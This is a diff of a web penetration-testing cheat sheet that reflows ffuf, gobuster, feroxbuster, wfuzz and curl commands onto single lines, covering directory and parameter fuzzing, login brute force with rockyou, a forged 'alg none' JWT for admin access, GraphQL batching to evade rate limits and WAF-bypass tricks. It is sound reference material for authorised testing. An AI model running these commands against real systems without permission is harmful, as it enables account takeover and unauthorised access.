@@ -90,24 +90,16 @@ ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt
 ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 
 # Filter 404 noise by size
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -fs 0
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 0
 
 # Match only interesting codes
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -mc 200,301,302,403
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403
 
 # Recursive
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -recursion -recursion-depth 3 -mc 200,301,302,403
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 3 -mc 200,301,302,403
 
 # Auto-calibrate (ffuf detects noise automatically)
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -ac
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac
 ```
 
 ---
@@ -116,20 +108,13 @@ ffuf -u http://target.com/FUZZ \
 
 ```bash
 # Fuzz files with extension list
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
-  -mc 200,301,302,403
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,301,302,403
 
 # Append extensions to a word list
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-  -e .php,.html,.txt,.asp,.aspx,.jsp,.bak,.zip,.conf,.log \
-  -mc 200,301,302,403
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.html,.txt,.asp,.aspx,.jsp,.bak,.zip,.conf,.log -mc 200,301,302,403
 
 # Two-step: find dirs first, then files inside
-ffuf -u http://target.com/admin/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
-  -e .php,.txt,.bak -mc 200
+ffuf -u http://target.com/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak -mc 200
 ```
 
 ---
@@ -140,34 +125,20 @@ ffuf -u http://target.com/admin/FUZZ \
 
 ```bash
 # Fuzz parameter name
-ffuf -u "http://target.com/search?FUZZ=test" \
-  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -fs <default_size>
+ffuf -u "http://target.com/search?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <default_size>
 
 # Fuzz parameter value
-ffuf -u "http://target.com/search?id=FUZZ" \
-  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-  -mc 200 -fs <error_size>
+ffuf -u "http://target.com/search?id=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs <error_size>
 ```
 
 ### POST Parameters
 
 ```bash
 # Fuzz POST param name
-ffuf -u http://target.com/login \
-  -X POST \
-  -d "FUZZ=test&password=test" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -fs <default_size>
+ffuf -u http://target.com/login -X POST -d "FUZZ=test&password=test" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <default_size>
 
 # Fuzz POST param value
-ffuf -u http://target.com/login \
-  -X POST \
-  -d "username=admin&password=FUZZ" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -w /usr/share/wordlists/rockyou.txt \
-  -fc 401,403 -fs <fail_size>
+ffuf -u http://target.com/login -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt -fc 401,403 -fs <fail_size>
 ```
 
 ---
@@ -175,17 +146,10 @@ ffuf -u http://target.com/login \
 ## Virtual Host Fuzzing
 
 ```bash
-ffuf -u http://TARGET_IP \
-  -H "Host: FUZZ.target.com" \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -fs <default_response_size>
+ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_response_size>
 
 # If target uses HTTPS
-ffuf -u https://TARGET_IP \
-  -H "Host: FUZZ.target.com" \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -fs <default_response_size> \
-  -k   # ignore TLS cert errors
+ffuf -u https://TARGET_IP -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_response_size> -k   # ignore TLS cert errors
 ```
 
 ---
@@ -193,14 +157,10 @@ ffuf -u https://TARGET_IP \
 ## Subdomain Fuzzing
 
 ```bash
-ffuf -u http://FUZZ.target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -mc 200,301,302,403
+ffuf -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403
 
 # With HTTPS
-ffuf -u https://FUZZ.target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -mc 200,301,302,403 -k
+ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -k
 ```
 
 ---
@@ -211,31 +171,17 @@ Use named keywords when fuzzing multiple positions simultaneously.
 
 ```bash
 # Two wordlists — clusterbomb style
-ffuf -u http://target.com/FOLDER/FILE.EXT \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FOLDER \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt:FILE \
-  -w extensions.txt:EXT \
-  -mc 200
+ffuf -u http://target.com/FOLDER/FILE.EXT -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FOLDER -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt:FILE -w extensions.txt:EXT -mc 200
 
 # Credential brute force (username + password)
-ffuf -u http://target.com/login \
-  -X POST \
-  -d "username=USER&password=PASS" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -w usernames.txt:USER \
-  -w /usr/share/wordlists/rockyou.txt:PASS \
-  -fc 401 -fs <fail_size>
+ffuf -u http://target.com/login -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -w usernames.txt:USER -w /usr/share/wordlists/rockyou.txt:PASS -fc 401 -fs <fail_size>
 ```
 
 > **Warning:** Multiple wordlists = cartesian product of attempts. `100 users × 100 passwords = 10,000 requests`. Use `-mode clusterbomb` (default) or `-mode pitchfork` (pairs by line number).
 
 ```bash
 # Pitchfork — pairs line 1 of list1 with line 1 of list2
-ffuf -u http://target.com/login \
-  -X POST -d "username=USER&password=PASS" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -w users.txt:USER -w passes.txt:PASS \
-  -mode pitchfork -fc 401
+ffuf -u http://target.com/login -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -w users.txt:USER -w passes.txt:PASS -mode pitchfork -fc 401
 ```
 
 ---
@@ -244,30 +190,17 @@ ffuf -u http://target.com/login \
 
 ```bash
 # REST API path fuzzing
-ffuf -u http://api.target.com/v1/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-  -mc 200,201,401,403
+ffuf -u http://api.target.com/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403
 
 # With auth header
-ffuf -u http://api.target.com/v1/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-  -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -mc 200,201,401,403
+ffuf -u http://api.target.com/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -mc 200,201,401,403
 
 # Fuzz API version
-ffuf -u http://api.target.com/FUZZ/users \
-  -w versions.txt \
-  -mc 200,401,403
+ffuf -u http://api.target.com/FUZZ/users -w versions.txt -mc 200,401,403
 # versions.txt: v1, v2, v3, api, api/v1, api/v2 ...
 
 # JSON body fuzzing
-ffuf -u http://api.target.com/login \
-  -X POST \
-  -d '{"username":"admin","password":"FUZZ"}' \
-  -H "Content-Type: application/json" \
-  -w /usr/share/wordlists/rockyou.txt \
-  -fr '"error"'
+ffuf -u http://api.target.com/login -X POST -d '{"username":"admin","password":"FUZZ"}' -H "Content-Type: application/json" -w /usr/share/wordlists/rockyou.txt -fr '"error"'
 ```
 
 ---
@@ -276,22 +209,13 @@ ffuf -u http://api.target.com/login \
 
 ```bash
 # User-Agent fuzzing
-ffuf -u http://target.com/admin \
-  -H "User-Agent: FUZZ" \
-  -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt \
-  -mc 200,302
+ffuf -u http://target.com/admin -H "User-Agent: FUZZ" -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -mc 200,302
 
 # X-Forwarded-For bypass
-ffuf -u http://target.com/admin \
-  -H "X-Forwarded-For: FUZZ" \
-  -w /usr/share/seclists/Fuzzing/IPs.txt \
-  -mc 200,302
+ffuf -u http://target.com/admin -H "X-Forwarded-For: FUZZ" -w /usr/share/seclists/Fuzzing/IPs.txt -mc 200,302
 
 # Cookie value fuzzing
-ffuf -u http://target.com/profile \
-  -b "session=FUZZ" \
-  -w sessions.txt \
-  -mc 200 -fs <unauth_size>
+ffuf -u http://target.com/profile -b "session=FUZZ" -w sessions.txt -mc 200 -fs <unauth_size>
 ```
 
 ---
@@ -339,33 +263,19 @@ sudo apt install gobuster
 gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 
 # With extensions
-gobuster dir -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
-  -x php,html,txt,bak,zip,conf \
-  -t 50
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,bak,zip,conf -t 50
 
 # Filter status codes
-gobuster dir -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -b 404,403 \
-  -t 50
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -b 404,403 -t 50
 
 # With cookies / auth header
-gobuster dir -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -c "session=abc123" \
-  -H "Authorization: Bearer <token>" \
-  -t 50
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -c "session=abc123" -H "Authorization: Bearer <token>" -t 50
 
 # HTTPS — ignore cert errors
-gobuster dir -u https://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -k -t 50
+gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 50
 
 # Output to file
-gobuster dir -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -o gobuster_dirs.txt
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster_dirs.txt
 ```
 
 **Key dir flags:**
@@ -392,59 +302,38 @@ gobuster dir -u http://target.com \
 
 ```bash
 # Basic subdomain brute force
-gobuster dns -d target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -t 50
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
 
 # Show IP addresses of discovered subdomains
-gobuster dns -d target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-  -t 50 --show-ips
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --show-ips
 
 # Use specific DNS resolver
-gobuster dns -d target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -r 8.8.8.8 -t 50
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 8.8.8.8 -t 50
 ```
 
 ### vhost — Virtual Host Enumeration
 
 ```bash
-gobuster vhost -u http://target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -t 50
+gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
 
 # Append domain automatically (Gobuster >= 3.2)
-gobuster vhost -u http://target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  --append-domain \
-  -t 50
+gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
 
 # Filter by response size to remove noise
-gobuster vhost -u http://target.com \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  --append-domain \
-  --exclude-length 250 \
-  -t 50
+gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250 -t 50
 ```
 
 ### fuzz — Generic Fuzzing Mode
 
 ```bash
 # Fuzz any part of a URL
-gobuster fuzz -u "http://target.com/FUZZ" \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
-  -b 404
+gobuster fuzz -u "http://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -b 404
 
 # Fuzz GET parameter value
-gobuster fuzz -u "http://target.com/page?id=FUZZ" \
-  -w ids.txt \
-  -b 400,404
+gobuster fuzz -u "http://target.com/page?id=FUZZ" -w ids.txt -b 400,404
 
 # Fuzz subdomain in URL
-gobuster fuzz -u "http://FUZZ.target.com" \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -b 404
+gobuster fuzz -u "http://FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -b 404
 ```
 
 ### s3 — Amazon S3 Bucket Enumeration
@@ -485,14 +374,10 @@ wget https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_202
 kr scan http://target.com -w routes-large.kite
 
 # Scan with text wordlist
-kr scan http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-  -x 20
+kr scan http://target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -x 20
 
 # Scan with auth header
-kr scan http://target.com \
-  -w routes-large.kite \
-  -H "Authorization: Bearer <token>"
+kr scan http://target.com -w routes-large.kite -H "Authorization: Bearer <token>"
 
 # Scan multiple targets
 kr scan targets.txt -w routes-large.kite
@@ -522,19 +407,14 @@ Found an interesting endpoint? Replay it through Burp for manual inspection:
 
 ```bash
 # Route all kr traffic through Burp proxy
-kr scan http://target.com \
-  -w routes-large.kite \
-  --proxy http://127.0.0.1:8080
+kr scan http://target.com -w routes-large.kite --proxy http://127.0.0.1:8080
 ```
 
 ### Brute API with Text Wordlist
 
 ```bash
 # Use large Assetnote HTTP archive API routes
-kr brute http://target.com \
-  -w httparchive_apiroutes_2024_01_28.txt \
-  -x 20 \
-  -H "Content-Type: application/json"
+kr brute http://target.com -w httparchive_apiroutes_2024_01_28.txt -x 20 -H "Content-Type: application/json"
 ```
 
 ### Differences from ffuf
@@ -555,27 +435,16 @@ Alternative to ffuf — more flexible with payload types.
 
 ```bash
 # Directory fuzzing
-wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  --hc 404 \
-  http://target.com/FUZZ
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 http://target.com/FUZZ
 
 # POST body
-wfuzz -c -w /usr/share/wordlists/rockyou.txt \
-  --hc 401 \
-  -d "username=admin&password=FUZZ" \
-  http://target.com/login
+wfuzz -c -w /usr/share/wordlists/rockyou.txt --hc 401 -d "username=admin&password=FUZZ" http://target.com/login
 
 # Header fuzzing
-wfuzz -c -w agents.txt \
-  -H "User-Agent: FUZZ" \
-  --hc 403 \
-  http://target.com/admin
+wfuzz -c -w agents.txt -H "User-Agent: FUZZ" --hc 403 http://target.com/admin
 
 # Multiple positions (pitchfork)
-wfuzz -c -z file,users.txt -z file,passwords.txt \
-  --hc 401 \
-  -d "user=FUZZ&pass=FUZ2Z" \
-  http://target.com/login
+wfuzz -c -z file,users.txt -z file,passwords.txt --hc 401 -d "user=FUZZ&pass=FUZ2Z" http://target.com/login
 ```
 
 **wfuzz filter flags:**
@@ -739,41 +608,25 @@ sudo apt install feroxbuster
 
 ```bash
 # Recursive (default depth 4)
-feroxbuster -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 
 # With extensions
-feroxbuster -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
-  -x php,html,txt,bak,zip \
-  -t 50
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,bak,zip -t 50
 
 # Limit recursion depth
-feroxbuster -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  --depth 2 -t 50
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 2 -t 50
 
 # Filter noise by size
-feroxbuster -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  --filter-size 0 --filter-status 404
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --filter-size 0 --filter-status 404
 
 # With cookies / auth
-feroxbuster -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -b "session=abc123" \
-  -H "Authorization: Bearer <token>"
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -b "session=abc123" -H "Authorization: Bearer <token>"
 
 # HTTPS — ignore cert
-feroxbuster -u https://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -k
+feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k
 
 # Save + resume (useful for long scans)
-feroxbuster -u http://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  --output ferox_output.txt \
-  --resume-from ferox_output.txt
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --output ferox_output.txt --resume-from ferox_output.txt
 ```
 
 ### Key Flags
@@ -826,13 +679,10 @@ arjun -u http://target.com/api/user -m JSON
 arjun -u http://target.com/api -m XML
 
 # With auth header
-arjun -u http://target.com/api/profile \
-  -m GET \
-  -H "Authorization: Bearer <token>"
+arjun -u http://target.com/api/profile -m GET -H "Authorization: Bearer <token>"
 
 # Custom wordlist
-arjun -u http://target.com/search \
-  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+arjun -u http://target.com/search -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 
 # Increase request rate
 arjun -u http://target.com/search -t 10
@@ -961,9 +811,7 @@ curl http://target.com/admin -H "User-Agent: Googlebot/2.1"
 
 ```bash
 # Try all path variations at once
-ffuf -u http://target.com/FUZZ \
-  -w bypass_paths.txt \
-  -mc 200,301,302
+ffuf -u http://target.com/FUZZ -w bypass_paths.txt -mc 200,301,302
 
 # bypass_paths.txt contents:
 # admin
@@ -985,14 +833,10 @@ ffuf -u http://target.com/FUZZ \
 
 ```bash
 # Check if introspection is enabled
-curl -s -X POST http://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { types { name } } }"}'
+curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'
 
 # Full introspection query
-curl -s -X POST http://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind } } } } } }"}'
+curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind } } } } } }"}'
 
 # Visualise schema with InQL (Burp extension) or graphql-voyager
 ```
@@ -1010,41 +854,24 @@ curl -s -X POST http://target.com/graphql \
 /graphiql
 /playground
 
-ffuf -u http://target.com/FUZZ \
-  -w graphql_endpoints.txt \
-  -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __typename }"}' \
-  -mc 200 -fr "errors"
+ffuf -u http://target.com/FUZZ -w graphql_endpoints.txt -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -mc 200 -fr "errors"
 ```
 
 ### Field / Type Fuzzing
 
 ```bash
 # Fuzz field names on a known type
-ffuf -u http://target.com/graphql \
-  -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user { FUZZ } }"}' \
-  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -fr "Cannot query field\|Unknown field"
+ffuf -u http://target.com/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{ user { FUZZ } }"}' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fr "Cannot query field\|Unknown field"
 
 # Fuzz argument values (e.g., IDOR via id)
-ffuf -u http://target.com/graphql \
-  -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user(id: FUZZ) { id email } }"}' \
-  -w ids.txt \
-  -mc 200 -fr '"user":null'
+ffuf -u http://target.com/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{ user(id: FUZZ) { id email } }"}' -w ids.txt -mc 200 -fr '"user":null'
 ```
 
 ### Batching Abuse (Rate Limit Bypass)
 
 ```bash
 # Send many queries in one request — bypasses per-request rate limiting
-curl -s -X POST http://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '[
+curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d '[
     {"query":"mutation { login(user:\"admin\", pass:\"password1\") { token } }"},
     {"query":"mutation { login(user:\"admin\", pass:\"password2\") { token } }"},
     {"query":"mutation { login(user:\"admin\", pass:\"password3\") { token } }"}
@@ -1074,21 +901,14 @@ clairvoyance -u http://target.com/graphql -o schema.json
 
 ```bash
 # Step 1: find directories
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -mc 200,301,302,403 \
-  -o dirs.json -of json
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -o dirs.json -of json
 
 # Step 2: extract URLs from results
 cat dirs.json | jq -r '.results[].url' > found_dirs.txt
 
 # Step 3: fuzz files inside each found directory
 while read dir; do
-  ffuf -u "${dir}/FUZZ" \
-    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
-    -e .php,.txt,.bak,.zip \
-    -mc 200 -s \
-    -o "files_$(echo $dir | md5sum | cut -c1-6).json" -of json
+  ffuf -u "${dir}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.zip -mc 200 -s -o "files_$(echo $dir | md5sum | cut -c1-6).json" -of json
 done < found_dirs.txt
 ```
 
@@ -1107,10 +927,7 @@ cat live_hosts.txt | awk '{print $1}' > live_urls.txt
 # Step 4: dir fuzz each live host
 while read url; do
   echo "[*] Fuzzing $url"
-  ffuf -u "${url}/FUZZ" \
-    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-    -mc 200,301,302,403 -ac -s \
-    >> all_dirs.txt
+  ffuf -u "${url}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -ac -s >> all_dirs.txt
 done < live_urls.txt
 ```
 
@@ -1126,9 +943,7 @@ cat params.json | jq -r '.[]' > param_names.txt
 # Step 3: fuzz each param for LFI/SSRF/SQLi
 while read param; do
   echo "[*] Testing param: $param"
-  ffuf -u "http://target.com/search?${param}=FUZZ" \
-    -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-    -mc 200 -fs <error_size> -s >> lfi_results.txt
+  ffuf -u "http://target.com/search?${param}=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs <error_size> -s >> lfi_results.txt
 done < param_names.txt
 ```
 
@@ -1154,10 +969,7 @@ Beyond status codes and size — indicators that something interesting happened:
 
 ```bash
 # Show response times — look for outliers
-ffuf -u "http://target.com/search?q=FUZZ" \
-  -w payloads.txt \
-  -mc all -fs <normal_size> \
-  -of json -o timing.json
+ffuf -u "http://target.com/search?q=FUZZ" -w payloads.txt -mc all -fs <normal_size> -of json -o timing.json
 
 # Extract slowest responses
 cat timing.json | jq '.results | sort_by(.duration) | reverse | .[0:10] | .[] | {input: .input, duration: .duration, status: .status}'
@@ -1328,8 +1140,7 @@ echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='    # encode new header
 echo -n '{"user":"admin","role":"admin"}' | base64 | tr -d '=' # encode new payload
 
 # Construct token: <new_header>.<new_payload>.   (empty signature, trailing dot)
-curl http://target.com/admin \
-  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
+curl http://target.com/admin -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
 ```
 
 ### Weak Secret Brute Force
@@ -1394,9 +1205,7 @@ jwt_tool <token> -I -pc user -pv admin  # inject claim
 
 ```bash
 # URL encode
-ffuf -u "http://target.com/search?q=FUZZ" \
-  -w payloads.txt \
-  -w /usr/share/seclists/Fuzzing/URL-Encoded.txt
+ffuf -u "http://target.com/search?q=FUZZ" -w payloads.txt -w /usr/share/seclists/Fuzzing/URL-Encoded.txt
 
 # Double URL encode (bypass single-decode WAFs)
 # < becomes %253c (encode % to %25, then c)
@@ -1412,10 +1221,7 @@ ffuf -u "http://target.com/search?q=FUZZ" \
 
 ```bash
 # Bypass WAF body inspection by sending body in chunks
-curl http://target.com/login \
-  -H "Transfer-Encoding: chunked" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-binary $'5\r\nuser=\r\n5\r\nadmin\r\n0\r\n\r\n'
+curl http://target.com/login -H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded" --data-binary $'5\r\nuser=\r\n5\r\nadmin\r\n0\r\n\r\n'
 ```
 
 ### Case Mangling
@@ -1435,18 +1241,10 @@ curl http://target.com/login \
 
 ```bash
 # Add extra headers to confuse WAF signature matching
-curl http://target.com/ \
-  -H "X-Forwarded-For: 127.0.0.1" \
-  -H "X-Originating-IP: 127.0.0.1" \
-  -H "X-Remote-IP: 127.0.0.1" \
-  -H "X-Remote-Addr: 127.0.0.1"
+curl http://target.com/ -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1"
 
 # Rotate User-Agent
-ffuf -u http://target.com/FUZZ \
-  -w wordlist.txt \
-  -H "User-Agent: UAFUZZ" \
-  -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt:UAFUZZ \
-  -w wordlist.txt:FUZZ
+ffuf -u http://target.com/FUZZ -w wordlist.txt -H "User-Agent: UAFUZZ" -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt:UAFUZZ -w wordlist.txt:FUZZ
 ```
 
 ### Null Bytes / Comment Injection
@@ -1473,12 +1271,7 @@ Changing Content-Type can hit different code paths or bypass WAF rules:
 # text/xml                           →  <root><user>admin</user></root>
 
 # ffuf — fuzz Content-Type
-ffuf -u http://target.com/api/login \
-  -X POST \
-  -H "Content-Type: FUZZ" \
-  -d '{"user":"admin","pass":"test"}' \
-  -w content_types.txt \
-  -mc 200,302 -fs <fail_size>
+ffuf -u http://target.com/api/login -X POST -H "Content-Type: FUZZ" -d '{"user":"admin","pass":"test"}' -w content_types.txt -mc 200,302 -fs <fail_size>
 ```
 
 ---
@@ -1542,22 +1335,14 @@ wscat -c ws://target.com/ws -H "Cookie: session=abc123"
 
 ```bash
 # Send ALL requests through Burp (slow — every request visible in Burp)
-ffuf -u http://target.com/FUZZ \
-  -w wordlist.txt \
-  -x http://127.0.0.1:8080
+ffuf -u http://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080
 
 # -replay-proxy — only forward INTERESTING hits to Burp (much better)
 # ffuf handles filtering, only matched results go to Burp for inspection
-ffuf -u http://target.com/FUZZ \
-  -w wordlist.txt \
-  -mc 200,301,302,403 \
-  -replay-proxy http://127.0.0.1:8080
+ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -replay-proxy http://127.0.0.1:8080
